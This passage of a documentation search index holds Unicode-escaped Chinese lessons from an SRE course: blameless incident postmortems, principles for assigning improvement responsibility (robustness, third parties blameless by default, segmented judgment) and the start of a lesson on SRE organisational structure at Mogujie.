<p>\u7b2c\u4e8c\u95ee\uff1a\u6211\u4eec\u505a\u4ec0\u4e48\uff0c\u600e\u4e48\u505a\u624d\u80fd\u786e\u4fdd\u4e0b\u6b21\u4e0d\u4f1a\u518d\u51fa\u73b0\u7c7b\u4f3c\u6545\u969c\uff1f</p> </li> <li>\u7b2c\u4e09\u95ee\uff1a\u5f53\u65f6\u5982\u679c\u6211\u4eec\u505a\u4e86\u4ec0\u4e48\uff0c\u53ef\u4ee5\u7528\u66f4\u77ed\u7684\u65f6\u95f4\u6062\u590d\u4e1a\u52a1\uff1f</li> </ul> <p>\u5177\u4f53\u5f00\u590d\u76d8\u4f1a\u7684\u65f6\u5019\uff0c\u5c31\u662f\u7d27\u6263\u7740\u8fd9\u4e09\u95ee\u6765\u8fdb\u884c\u7684\u3002\u9664\u6b64\u4e4b\u5916\u4e0d\u5141\u8bb8\u51fa\u73b0\u76f8\u4e92\u6307\u8d23\u548c\u57cb\u6028\u7684\u60c5\u51b5\uff0c\u5982\u679c\u51fa\u73b0\uff0c\u4f1a\u8bae\u4e3b\u6301\u8005\u8981\u53ca\u65f6\u63a7\u5236\u5e76\u6253\u65ad\u3002\u4f1a\u8bae\u4e3b\u6301\u8005\u8fd9\u4e2a\u89d2\u8272\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8ddf\u6211\u4eec\u4e0a\u4e00\u8bb2\u63d0\u5230\u7684CL\uff08Communication Lead\uff09\uff0c\u4e5f\u5c31\u662f\u201c\u6c9f\u901a\u5f15\u5bfc\u201d\u662f\u4e00\u4e2a\u89d2\u8272\uff0c\u5728\u6211\u4eec\u516c\u53f8\u5185\u90e8\u53eb\u6280\u672f\u652f\u6301\u3002</p>"},{"location":"ops/50-sre-mogu-08/#_2","title":"\u6545\u969c\u5224\u5b9a\u7684\u4e09\u539f\u5219","text":"<p>\u901a\u8fc7\u9ec4\u91d1\u4e09\u95ee\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6545\u969c\u53d1\u751f\u7684\u539f\u56e0\uff0c\u4e5f\u660e\u786e\u4e86\u505a\u4ec0\u4e48\u53ef\u4ee5\u4f18\u5316\uff0c\u90a3\u63a5\u4e0b\u6765\u5c31\u662f\u843d\u5730\u4e86\u3002\u8981\u843d\u5730\uff0c\u5c31\u8981\u660e\u786e\u5230\u5e95\u5e94\u8be5\u7531\u8c01\u6765\u627f\u62c5\u4e3b\u8981\u7684\u6539\u8fdb\u804c\u8d23\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u6211\u6ca1\u6709\u7528\u8c01\u5e94\u8be5\u627f\u62c5\u4e3b\u8981\u8d23\u4efb\uff0c\u800c\u662f\u627f\u62c5\u4e3b\u8981\u7684\u6539\u8fdb\u804c\u8d23\uff0c\u4e5f\u5c31\u662f\u7531\u8c01\u6765\u6267\u884c\u6539\u8fdb\u63aa\u65bd\u3002</p> <p>\u5177\u4f53\u600e\u4e48\u6765\u505a\u5462\uff1f\u6211\u4eec\u5236\u5b9a\u4e86\u4e00\u4e9b\u6545\u969c\u5224\u5b9a\u539f\u5219\uff0c\u6700\u91cd\u8981\u7684\u5c31\u662f\u4e0b\u9762\u8fd9\u4e09\u6761\u3002</p>"},{"location":"ops/50-sre-mogu-08/#1","title":"1. \u5065\u58ee\u6027\u539f\u5219\u3002","text":"<p>\u8fd9\u4e2a\u539f\u5219\u662f\u8bf4\u6bcf\u4e2a\u90e8\u4ef6\u81ea\u8eab\u8981\u5177\u5907\u4e00\u5b9a\u7684\u81ea\u6108\u80fd\u529b\uff0c\u6bd4\u5982\u4e3b\u5907\u3001\u96c6\u7fa4\u3001\u9650\u6d41\u3001\u964d\u7ea7\u548c\u91cd\u8bd5\u7b49\u7b49\u3002\u4f8b\u5982\uff0c\u5728B\u4f9d\u8d56A\u7684\u72b6\u6001\u4e0b\uff0c\u88ab\u4f9d\u8d56\u65b9A\u51fa\u73b0\u95ee\u9898\uff0c\u4f46\u662f\u80fd\u591f\u5feb\u901f\u6062\u590d\uff0c\u800c\u4f9d\u8d56\u65b9B\u65e0\u6cd5\u5feb\u901f\u6062\u590d\uff0c\u5bfc\u81f4\u6545\u969c\u8513\u5ef6\u3002\u8fd9\u65f6\uff0c\u627f\u62c5\u4e3b\u8981\u8d23\u4efb\u7684\u662f\u4f9d\u8d56\u65b9B\uff0c\u800c\u4e0d\u662f\u88ab\u4f9d\u8d56\u65b9A\u3002</p> <p>\u6211\u4eec\u524d\u9762\u4ecb\u7ecd\u7684\u670d\u52a1\u5668\u548c\u7f51\u7edc\u7c7b\u6545\u969c\uff0c\u5176\u5b9e\u5c31\u9002\u7528\u8fd9\u4e2a\u539f\u5219\u3002\u5982\u4ea4\u6362\u673a\u6545\u969c\u53d1\u751f\u4e3b\u5907\u5207\u6362\u5bfc\u81f4\u7684\u7f51\u7edc\u77ac\u65f6\u6216\u77ed\u6682\u6296\u52a8\uff0c\u4ece\u7f51\u7edc\u8bbe\u5907\u8fd9\u4e2a\u7ec4\u4ef6\u6765\u8bf4\uff0c\u81ea\u8eab\u662f\u6709\u81ea\u6108\u80fd\u529b\u7684\uff0c\u800c\u4e14\u5728\u6781\u77ed\u7684\u65f6\u95f4\u5185\u5c31\u53ef\u4ee5\u6062\u590d\u3002\u5982\u679c\u5e94\u7528\u56e0\u4e3a\u6296\u52a8\u800c\u5931\u8d25\u3001\u65e0\u6cd5\u81ea\u6108\uff0c\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e1a\u52a1\u5e94\u7528\u5c31\u4e0d\u80fd\u4ee5\u670d\u52a1\u5668\u6216\u7f51\u7edc\u6545\u969c\u4e3a\u7406\u7531\uff0c\u4e0d\u627f\u62c5\u6539\u8fdb\u804c\u8d23\u3002</p> <p>\u518d\u6bd4\u5982\uff0c\u6211\u4eec\u4e4b\u524d\u8bb2\u7684\u5f3a\u5f31\u4f9d\u8d56\u95ee\u9898\u3002\u539f\u5219\u4e0a\uff0c\u6838\u5fc3\u5e94\u7528\u5bf9\u975e\u6838\u5fc3\u5e94\u7528\u7684\u4f9d\u8d56\u5fc5\u987b\u8981\u6709\u964d\u7ea7\u548c\u9650\u6d41\u624b\u6bb5\u3002\u5982\u679c\u56e0\u4e3a\u975e\u6838\u5fc3\u5e94\u7528\u7684\u6545\u969c\u6216\u8005\u77ac\u65f6\u9ad8\u5e76\u53d1\u8bbf\u95ee\uff0c\u5bfc\u81f4\u6838\u5fc3\u5e94\u7528\u6545\u969c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4e3b\u8981\u7684\u6539\u8fdb\u8d23\u4efb\u5728\u6838\u5fc3\u5e94\u7528\uff0c\u975e\u6838\u5fc3\u5e94\u7528\u53ea\u9700\u8981\u914d\u5408\u6539\u9020\u3002</p>"},{"location":"ops/50-sre-mogu-08/#2","title":"2. \u7b2c\u4e09\u65b9\u9ed8\u8ba4\u65e0\u8d23\u3002","text":"<p>\u8fd9\u4e00\u6761\u662f\u4e0a\u4e00\u6761\u7684\u5ef6\u4f38\uff0c\u5982\u679c\u4f7f\u7528\u5230\u4e86\u7b2c\u4e09\u65b9\u7684\u670d\u52a1\uff0c\u5982\u516c\u6709\u4e91\u7684\u5404\u7c7b\u670d\u52a1\uff0c\u5305\u62ecIaaS\u3001PaaS\u3001CDN\u4ee5\u53ca\u89c6\u9891\u7b49\u7b49\uff0c\u6211\u4eec\u7684\u539f\u5219\u5c31\u662f\u9ed8\u8ba4\u7b2c\u4e09\u65b9\u65e0\u8d23\u3002</p> <p>\u8fd9\u79cd\u6d89\u53ca\u7b2c\u4e09\u65b9\u670d\u52a1\u7684\u60c5\u51b5\uff0c\u5728\u5224\u5b9a\u6539\u8fdb\u8d23\u4efb\u65f6\u4f1a\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u5bf9\u5185\u8c01\u7684\u670d\u52a1\u53d7\u5f71\u54cd\u8c01\u6539\u8fdb\uff0c\u5e76\u5bf9\u5916\u63a8\u8fdb\u7b2c\u4e09\u65b9\u6539\u8fdb\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u6309\u7167\u6211\u4eec\u4e4b\u524d\u8bb2\u7684\uff0c\u7a33\u5b9a\u6027\u4e00\u5b9a\u8981\u505a\u5230\u76f8\u5bf9\u81ea\u6211\u53ef\u63a7\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u4f9d\u8d56\u5916\u90e8\u3002</p> <p>\u6bd4\u5982\uff0c\u4e00\u4e2a\u5e94\u7528\u4f7f\u7528\u4e86CDN\u670d\u52a1\uff0c\u5982\u679c\u4e00\u5bb6CDN\u5382\u5546\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0c\u8981\u505a\u5230\u968f\u65f6\u53ef\u4ee5\u5207\u6362\u5230\u53e6\u5916\u4e00\u5230\u4e24\u5bb6\uff0c\u8fd9\u65f6\u5c31\u4e0d\u80fd\u4ee5\u67d0\u5bb6CDN\u670d\u52a1\u6545\u969c\u4e3a\u7531\u4e0d\u505a\u6539\u8fdb\u3002\u5982\u679c\u7528\u5230\u4e86\u4e91\u5b58\u50a8\uff0c\u5982S3\u3001OSS\u6216COS\u8fd9\u6837\u7684\u670d\u52a1\uff0c\u4e00\u5b9a\u8981\u4fdd\u8bc1\u5b58\u50a8\u6709\u4e3b\u5907\uff0c\u5f53\u4e00\u4e2a\u533a\u57df\u6709\u95ee\u9898\u65f6\uff0c\u4e5f\u8981\u505a\u5230\u53ef\u5207\u6362\uff0c\u751a\u81f3\u5bb9\u5fcd\u4e00\u5b9a\u7684\u4e1a\u52a1\u6709\u635f\uff0c\u4f46\u662f\u5fc5\u987b\u4fdd\u969c\u5168\u91cf\u6ca1\u6709\u5927\u95ee\u9898\u3002</p> <p>\u5982\u679c\u518d\u63d0\u5347\u4e0b\u9ad8\u53ef\u7528\u89c6\u89d2\uff0c\u5c31\u8981\u8003\u8651\u505a\u5230\u53cc\u6d3b\u6216\u591a\u6d3b\uff0c\u5355\u4e2aZone\u751a\u81f3\u5355\u4e2aRegion\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u4e5f\u80fd\u505a\u5230\u5207\u6362\u3002</p> <p>\u5bf9\u5185\uff0c\u9ed8\u8ba4\u7b2c\u4e09\u65b9\u65e0\u8d23\uff0c\u7a33\u5b9a\u6027\u8d23\u4efb\u4e00\u5b9a\u662f\u5185\u90e8\u89d2\u8272\u627f\u62c5\uff0c\u8fd9\u6837\u505a\u6709\u65f6\u770b\u8d77\u6765\u867d\u7136\u4e0d\u592a\u5408\u7406\uff0c\u4f46\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u5c31\u662f\u8ba9\u5185\u90e8\u610f\u8bc6\u5230\u7a33\u5b9a\u6027\u548c\u9ad8\u53ef\u7528\u4e00\u5b9a\u662f\u6211\u4eec\u81ea\u5df1\u7684\u8d23\u4efb\uff0c\u51b3\u4e0d\u80fd\u4f9d\u8d56\u4efb\u4f55\u4e00\u4e2a\u7b2c\u4e09\u65b9\u3002\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u56fd\u5bb6\u7684\u519b\u4e8b\u56fd\u9632\uff0c\u53ef\u4ee5\u8ddf\u5916\u90e8\u5f62\u6210\u7edf\u4e00\u6218\u7ebf\uff0c\u53ef\u4ee5\u505a\u8054\u5408\u6f14\u4e60\u5171\u540c\u9632\u5fa1\uff0c\u4f46\u662f\u7edd\u4e0d\u53ef\u80fd\u5b8c\u5b8c\u5168\u5168\u4ea4\u7ed9\u53e6\u5916\u4e00\u4e2a\u56fd\u5bb6\u53bb\u5efa\u8bbe\u548c\u63a7\u5236\u3002</p> <p>\u540c\u65f6\uff0c\u8fd9\u4e5f\u662f\u9632\u6b62\u4e1a\u52a1\u4e0a\u4e91\u540e\uff0c\u5185\u90e8\u5c06\u5927\u91cf\u7684\u95ee\u9898\u4e22\u7ed9\u5916\u90e8\u4e91\u5382\u5546\u53bb\u627f\u62c5\uff0c\u751a\u81f3\u662f\u8ba9\u4e91\u5382\u5546\u201c\u80cc\u9505\u201d\uff0c\u4e45\u800c\u4e45\u4e4b\uff0c\u5185\u90e8\u5458\u5de5\u5bf9\u4e8e\u7a33\u5b9a\u6027\u7684\u8d23\u4efb\u5fc3\u5c31\u4e22\u5931\u6389\u4e86\u3002</p>"},{"location":"ops/50-sre-mogu-08/#3","title":"3. \u5206\u6bb5\u5224\u5b9a\u539f\u5219\u3002","text":"<p>\u8fd9\u4e2a\u539f\u5219\u4e3b\u8981\u5e94\u7528\u5728\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\u7684\u573a\u666f\u3002\u5f53\u53d1\u751f\u884d\u751f\u6545\u969c\uff0c\u6216\u8005\u6545\u969c\u8513\u5ef6\u7684\u539f\u56e0\u4e0e\u89e6\u53d1\u539f\u56e0\u4e0d\u540c\u65f6\uff0c\u6211\u4eec\u4f1a\u5c06\u4e00\u6b21\u6545\u969c\u5206\u6bb5\u5224\u65ad\u3002\u6bd4\u5982\u6211\u4eec\u5728\u4e0a\u4e00\u8bb2\u63d0\u5230\u7684\u5927\u4fc3\u6545\u969c\u6848\u4f8b\uff0c\u524d\u534a\u6bb5\u662f\u7531\u4e8e\u6a21\u578b\u8bc4\u4f30\u4e0d\u51c6\uff0c\u6ca1\u6709\u6545\u969c\u9694\u79bb\u624b\u6bb5\u9020\u6210\u7684\uff0c\u4f46\u662f\u540e\u534a\u6bb5\uff0c\u5c31\u662f\u56e0\u4e3aDBA\u7684\u8bef\u64cd\u4f5c\uff0c\u4ee5\u53ca\u6d41\u7a0b\u673a\u5236\u4e0d\u5b8c\u5584\u9020\u6210\u7684\u3002</p> <p>\u8fd9\u6837\u5206\u6bb5\u5224\u5b9a\u4f1a\u8ba9\u6545\u969c\u95ee\u9898\u66f4\u805a\u7126\uff0c\u6539\u8fdb\u63aa\u65bd\u4e5f\u4f1a\u66f4\u6709\u9488\u5bf9\u6027\u3002</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u6545\u969c\u5224\u5b9a\u7684\u4e00\u4e9b\u5173\u952e\u539f\u5219\u5c31\u8bb2\u5b8c\u4e86\u3002 \u505a\u4e2a\u5c0f\u7ed3\uff0c\u8fd9\u4e9b\u539f\u5219\u7684\u6839\u672c\u51fa\u53d1\u70b9\u5c31\u662f\u5e0c\u671b\u4f60\u6452\u5f03 \u201c\u6839\u56e0\u53ea\u6709\u4e00\u4e2a\u201d \u8fd9\u4e2a\u7684\u89c2\u70b9\uff0c\u4ee5\u66f4\u5f00\u653e\u7684\u5fc3\u6001\u53bb\u5bfb\u627e\u4e0d\u8db3\uff0c\u800c\u4e14\u8981\u4ece\u81ea\u8eab\u627e\u4e0d\u8db3\uff0c\u76ee\u7684\u5c31\u662f\u627e\u5230\u66f4\u591a\u53ef\u4ee5\u6539\u8fdb\u7684\u5730\u65b9\uff0c\u4e0d\u65ad\u4ece\u201c\u6545\u969c\u4e2d\u5b66\u4e60\u548c\u6539\u8fdb\u201d\u3002</p>"},{"location":"ops/50-sre-mogu-08/#_3","title":"\u603b\u7ed3","text":"<p>\u4eca\u5929\u7684\u5185\u5bb9\u5c31\u8bb2\u5b8c\u4e86\uff0c\u6211\u4eec\u518d\u6765\u590d\u4e60\u4e0b\u3002\u5728\u505a\u6545\u969c\u590d\u76d8\u65f6\uff0c\u6211\u7684\u7ecf\u9a8c\u548c\u5efa\u8bae\u662f\uff1a\u4e0d\u8981\u7ea0\u7ed3\u4e8e\u6545\u969c\u6839\u56e0\u5230\u5e95\u662f\u54ea\u4e2a\uff0c\u800c\u662f\u628a\u66f4\u591a\u7684\u6ce8\u610f\u529b\u653e\u5728\u505a\u54ea\u4e9b\u4e8b\u60c5\uff0c\u53ef\u4ee5\u63d0\u5347\u6545\u969c\u5904\u7406\u7684\u6548\u7387\uff0c\u7f29\u77ed\u4e1a\u52a1\u6545\u969c\u65f6\u957f\u3002</p> <p>\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e2a\u76ee\u7684\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u6545\u969c\u590d\u76d8\u7684\u9ec4\u91d1\u4e09\u95ee\uff0c\u540c\u65f6\u8fd8\u8bbe\u5b9a\u4e86\u4e09\u4e2a\u5224\u5b9a\u539f\u5219\uff0c\u660e\u786e\u6539\u8fdb\u63aa\u65bd\u7684\u4e3b\u8981\u804c\u8d23\u5e94\u8be5\u7531\u8c01\u6765\u627f\u62c5\u3002\u5e0c\u671b\u901a\u8fc7\u8fd9\u4e9b\u5177\u4f53\u7684\u95ee\u9898\u548c\u539f\u5219\uff0c\u80fd\u5e2e\u52a9\u4f60\u505a\u597d\u6545\u969c\u590d\u76d8\u3002</p> <p>\u5173\u4e8e\u6545\u969c\uff0c\u6211\u518d\u8bf4\u51e0\u53e5\u638f\u5fc3\u7a9d\u5b50\u7684\u8bdd\uff1a\u201c\u6545\u969c\u662f\u7cfb\u7edf\u8fd0\u884c\u7684\u5e38\u6001\uff0c\u6b63\u5e38\u624d\u662f\u7279\u6b8a\u72b6\u6001\u201d\u3002\u6240\u4ee5\uff0c\u4f60\u65e0\u8bba\u4f5c\u4e3a\u4ec0\u4e48\u89d2\u8272\uff0c\u4e00\u5b9a\u8981\u4ee5\u4e00\u9897\u5e73\u5e38\u5fc3\u6765\u5bf9\u5f85\u6545\u969c\uff0c\u80fd\u505a\u5230\u8fd9\u4e2a\u7a0b\u5ea6\u4e0d\u5bb9\u6613\uff0c\u8fd9\u5c31\u9700\u8981\u6211\u4eec\u66f4\u52a0\u8fa9\u8bc1\u5730\u770b\u5f85\u6545\u969c\uff0c\u6211\u4eec\u4e00\u5b9a\u8981\u505a\u5230\u9f13\u52b1\u6539\u8fdb\uff0c\u800c\u4e0d\u662f\u5904\u7f5a\u9519\u8bef\u3002</p>"},{"location":"ops/50-sre-mogu-09/","title":"09\uff5c\u6848\u4f8b\uff1a\u4e92\u8054\u7f51\u5178\u578b\u7684SRE\u7ec4\u7ec7\u67b6\u6784\u662f\u600e\u6837\u7684\uff1f","text":"<p>\u524d\u9762\u4e09\u8bb2\uff0c\u6211\u4eec\u4ece\u6545\u969c\u8fd9\u4e2a\u5173\u952e\u4e8b\u4ef6\u5165\u624b\uff0c\u8bb2\u89e3\u4e86\u201c\u4f18\u5148\u6062\u590d\u4e1a\u52a1\u662f\u6700\u9ad8\u4f18\u5148\u7ea7\u201d\u8fd9\u4e2a\u539f\u5219\uff0c\u57fa\u4e8e\u8fd9\u4e2a\u539f\u5219\uff0c\u5728\u6545\u969c\u53d1\u751f\u540e\uff0c\u6211\u4eec\u8981\u505a\u597d\u5feb\u901f\u54cd\u5e94\u548c\u5e94\u6025\uff0c\u5e76\u4ece\u6545\u969c\u4e2d\u5b66\u4e60\u548c\u6539\u8fdb\u3002\u5728\u8fd9\u4e2a\u5b66\u4e60\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u5e94\u8be5\u4e5f\u80fd\u4f53\u4f1a\u5230\uff0c\u9ad8\u6548\u7684\u6545\u969c\u5e94\u5bf9\u548c\u7ba1\u7406\u5de5\u4f5c\uff0c\u5176\u5b9e\u662f\u9700\u8981\u6574\u4e2a\u6280\u672f\u56e2\u961f\u5171\u540c\u53c2\u4e0e\u548c\u6295\u5165\u7684\u3002\u8fd9\u5c31\u5f15\u51fa\u4e86\u5927\u5bb6\u843d\u5730SRE\u90fd\u4f1a\u9047\u5230\u7684\u4e00\u4e2a\u96be\u70b9\uff1a\u7ec4\u7ec7\u67b6\u6784\u8c03\u6574\u3002</p> <p>\u90a3\u843d\u5730SRE\u5fc5\u987b\u8c03\u6574\u7ec4\u7ec7\u67b6\u6784\u5417\uff1f\u5178\u578b\u7684SRE\u7ec4\u7ec7\u67b6\u6784\u662f\u600e\u6837\u7684\uff1f\u63a5\u4e0b\u6765\uff0c\u6211\u4f1a\u7528\u4e24\u8bb2\u5185\u5bb9\u548c\u4f60\u63a2\u8ba8\u8fd9\u4e9b\u95ee\u9898\uff0c\u5206\u4eab\u6211\u5728\u8611\u83c7\u8857\u5b9e\u8df5\u7684\u4e00\u4e9b\u7ecf\u9a8c\u3002</p>"},{"location":"ops/50-sre-mogu-09/#sre","title":"\u843d\u5730SRE\u5fc5\u987b\u8c03\u6574\u7ec4\u7ec7\u67b6\u6784\u5417\uff1f","text":"<p>\u597d\uff0c\u90a3\u6211\u4eec\u5c31\u5f00\u59cb\u5427\uff0c\u5148\u7ed9\u4f60\u770b\u4e00\u5f20\u6280\u672f\u67b6\u6784\u56fe\u3002</p> <p></p> <p>\u8fd9\u662f\u8611\u83c7\u8857\u57fa\u4e8e\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u6280\u672f\u7684High-Level\u7684\u67b6\u6784\u56fe\uff0c\u4e5f\u662f\u975e\u5e38\u5178\u578b\u7684\u4e92\u8054\u7f51\u6280\u672f\u67b6\u6784\u56fe\uff0c\u81ea\u4e0b\u800c\u4e0a\u5171\u56db\u5c42\uff0c\u5206\u522b\u662f\u57fa\u7840\u8bbe\u65bd\u5c42\u3001\u4e1a\u52a1&amp;\u6280\u672f\u4e2d\u53f0\u5c42\u3001\u4e1a\u52a1\u524d\u53f0\u5c42\u4ee5\u53ca\u63a5\u5165\u5c42\uff0c\u5728\u53f3\u4fa7\u8fd8\u6709\u4e00\u4e2a\u6280\u672f\u4fdd\u969c\u4f53\u7cfb\u3002\u5982\u679c\u4f60\u5e73\u65f6\u7ecf\u5e38\u770b\u4e00\u4e9b\u67b6\u6784\u65b9\u9762\u7684\u56fe\u4e66\u548c\u6587\u7ae0\uff0c\u6216\u8005\u542c\u8fc7\u4e00\u4e9b\u6280\u672f\u5927\u4f1a\u6f14\u8bb2\u7684\u8bdd\uff0c\u5bf9\u8fd9\u6837\u7684\u56fe\u5e94\u8be5\u4e0d\u964c\u751f\u3002</p> <p>\u4f60\u4e5f\u8bb8\u4f1a\u95ee\uff0c\u54a6\uff0c\u6211\u4eec\u4e0d\u662f\u8bb2\u7ec4\u7ec7\u67b6\u6784\u5417\uff1f\u548b\u4e00\u4e0a\u6765\u5c31\u8bf4\u5230\u6280\u672f\u67b6\u6784\u4e0a\u4e86\uff1f\u522b\u6025\uff0c\u6211\u8fd9\u4e48\u8bb2\u662f\u6709\u539f\u56e0\u7684\uff0c\u5728\u8bb2SRE\u7684\u7ec4\u7ec7\u67b6\u6784\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u660e\u786e\u4e24\u70b9\u5185\u5bb9\u3002</p> <p>\u7b2c\u4e00\uff0c\u7ec4\u7ec7\u67b6\u6784\u8981\u4e0e\u6280\u672f\u67b6\u6784\u76f8\u5339\u914d\u3002</p> <p>\u6280\u672f\u67b6\u6784\u5b9e\u73b0\u7ec4\u7ec7\u76ee\u6807\uff0c\u7ec4\u7ec7\u67b6\u6784\u670d\u52a1\u5e76\u4fc3\u6210\u6280\u672f\u67b6\u6784\u7684\u5b9e\u73b0\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u4e0d\u4f1a\u5355\u7eaf\u53bb\u8bb2\u7ec4\u7ec7\u67b6\u6784\uff0c\u4e00\u5b9a\u4f1a\u7ed3\u5408\u7740\u6280\u672f\u67b6\u6784\u7684\u73b0\u72b6\u548c\u6f14\u8fdb\u8fc7\u7a0b\u6765\u5206\u6790\u3002</p> <p>\u7b2c\u4e8c\uff0cSRE\u662f\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u67b6\u6784\u7684\u4ea7\u7269\u3002</p> <p>SRE\u8fd9\u4e2a\u5c97\u4f4d\uff0c\u6216\u8005\u8bf4\u8fd9\u4e2a\u901a\u8fc7\u6700\u4f73\u5b9e\u8df5\u63d0\u70bc\u51fa\u6765\u7684\u65b9\u6cd5\u8bba\uff0c\u5c31\u662f\u5728Google\u8fd9\u6837\u4e00\u4e2a\u5168\u7403\u6700\u5927\u7684\u5e94\u7528\u5206\u5e03\u5f0f\u6280\u672f\u7684\u516c\u53f8\u4ea7\u751f\u51fa\u6765\u7684\u3002</p> <p>\u6b63\u662f\u56e0\u4e3a\u5206\u5e03\u5f0f\u6280\u672f\u7684\u590d\u6742\u6027\uff0c\u7279\u522b\u662f\u5728\u8fd0\u7ef4\u5c42\u9762\u7684\u8d85\u9ad8\u590d\u6742\u6027\uff0c\u624d\u4ea7\u751f\u4e86\u5bf9\u4f20\u7edf\u8fd0\u7ef4\u6a21\u5f0f\u548c\u7406\u5ff5\u7684\u51b2\u51fb\u548c\u53d8\u9769\u3002</p> <p>\u5982\u679c\u6211\u4eec\u53bb\u68b3\u7406\u4e00\u4e0b\u6574\u4e2a\u8f6f\u4ef6\u67b6\u6784\u53d1\u5c55\u7684\u5386\u7a0b\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u4e0b\u9762\u8fd9\u5f20\u56fe\u3002\u6211\u4eec\u4f1a\u53d1\u73b0\u4e0d\u4ec5\u4ec5\u662fSRE\u548cDevOps\uff0c\u5c31\u8fde\u5bb9\u5668\u76f8\u5173\u7684\u6280\u672f\uff0c\u6301\u7eed\u4ea4\u4ed8\u76f8\u5173\u7684\u65b9\u6cd5\u548c\u7406\u5ff5\uff0c\u4e5f\u662f\u5728\u5fae\u670d\u52a1\u67b6\u6784\u4e0d\u65ad\u6d41\u884c\u7684\u8d8b\u52bf\u4e0b\u6240\u4ea7\u751f\u7684\uff0c\u5b83\u4eec\u7684\u4ea7\u751f\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u5728\u8fd9\u79cd\u67b6\u6784\u4e0b\u8fd0\u7ef4\u590d\u6742\u5ea6\u8fc7\u9ad8\u7684\u95ee\u9898\u3002</p> <p>\u8fd9\u6837\u4e00\u5957\u67b6\u6784\u65b9\u6cd5\u4f53\u7cfb\uff0c\u4e5f\u6784\u6210\u4e86\u73b0\u5728\u975e\u5e38\u6d41\u884c\u548c\u706b\u70ed\u7684\u6982\u5ff5\uff1a\u4e91\u539f\u751f\u67b6\u6784\u3002</p> <p></p> <p>\u6240\u4ee5\uff0c\u4e0d\u5f97\u4e0d\u627f\u8ba4\uff0c\u8fd9\u91cc\u7684\u73b0\u5b9e\u60c5\u51b5\u5c31\u662f\uff0c\u57fa\u672c\u6240\u6709\u7684SRE\u7ecf\u9a8c\u90fd\u662f\u57fa\u4e8e\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u67b6\u6784\u7684\uff0c\u4e5f\u90fd\u662f\u5728\u8fd9\u6837\u4e00\u4e2a\u57fa\u7840\u4e0b\u4ea7\u751f\u7684\u3002\u5927\u5230BAT\u3001\u5934\u6761\u548c\u7f8e\u56e2\u7b49\uff0c\u4e2d\u7b49\u89c4\u6a21\u5982\u8611\u83c7\u8857\uff0c\u751a\u81f3\u662f\u5728\u4f20\u7edf\u884c\u4e1a\u4e2d\u843d\u5730\u6bd4\u8f83\u7a81\u51fa\u7684\uff0c\u5982\u90e8\u5206\u8fd0\u8425\u5546\u548c\u94f6\u884c\u3002</p> <p>\u90a3\u4e48\uff0c\u60f3\u8981\u5f15\u5165SRE\u4f53\u7cfb\uff0c\u5e76\u505a\u5bf9\u5e94\u7684\u7ec4\u7ec7\u67b6\u6784\u8c03\u6574\uff0c\u9996\u5148\u8981\u770b\u6211\u4eec\u7684\u6280\u672f\u67b6\u6784\u662f\u4e0d\u662f\u5728\u671d\u7740\u670d\u52a1\u5316\u548c\u5206\u5e03\u5f0f\u7684\u65b9\u5411\u6f14\u8fdb\u3002\u5982\u679c\u67b6\u6784\u8fd8\u6ca1\u8fd9\u4e48\u590d\u6742\uff0c\u5176\u5b9e\u4e5f\u6ca1\u6709\u5fc5\u8981\u5f15\u5165SRE\u8fd9\u4e48\u590d\u6742\u7684\u8fd0\u7ef4\u4f53\u7cfb\uff0c\u8fd9\u672c\u8eab\u5c31\u4e0d\u5339\u914d\uff1b\u518d\u5c31\u662f\u5982\u679c\u6ca1\u6709\u5bf9\u5e94\u7684\u67b6\u6784\u652f\u6301\uff0cSRE\u6280\u672f\u5c42\u9762\u7684\u5efa\u8bbe\u5c31\u6ca1\u6709\u5207\u5165\u70b9\uff0c\u60f3\u505a\u4e5f\u6ca1\u6cd5\u505a\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u7684\u6280\u672f\u67b6\u6784\u671d\u7740\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u7684\u65b9\u5411\u6f14\u8fdb\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u843d\u5730SRE\uff0c\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u7684\u7ec4\u7ec7\u67b6\u6784\u5c31\u8981\u5339\u914d\u6211\u4eec\u7684\u6280\u672f\u67b6\u6784\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8981\u60f3\u5728\u7ec4\u7ec7\u5185\u5f15\u5165\u5e76\u843d\u5730SRE\u8fd9\u5957\u4f53\u7cfb\uff0c\u539f\u6709\u6280\u672f\u56e2\u961f\u7684\u7ec4\u7ec7\u67b6\u6784\uff0c\u6216\u8005\u81f3\u5c11\u662f\u534f\u4f5c\u6a21\u5f0f\u5fc5\u987b\u8981\u505a\u51fa\u4e00\u4e9b\u53d8\u9769\u624d\u53ef\u4ee5\u3002</p> 